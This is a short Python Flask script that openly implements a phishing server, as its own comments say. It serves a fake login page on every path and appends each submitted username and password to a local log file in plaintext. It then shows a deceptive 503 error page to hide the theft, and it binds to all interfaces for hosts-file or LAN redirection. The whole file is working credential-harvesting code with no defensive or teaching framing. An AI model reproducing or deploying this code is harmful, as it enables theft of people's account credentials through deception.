from flask import Flask, render_template, request

app = Flask(__name__)

# Catch all paths and display the phishing login page
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return render_template('login.html')

# Called when the user submits the login form
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # 1) Log the user input
    with open('log.txt', 'a') as f:
        f.write(f'Username: {username} | Password: {password}\n')

    # 2) Show a "network error, please try again" page
    #    Returning HTTP 503 will make the browser display "Service Unavailable"
    return render_template('error.html'), 503

if __name__ == '__main__':
    # Listen on all interfaces, convenient for hosts file or LAN access
    app.run(host='0.0.0.0', port=5005, debug=True)
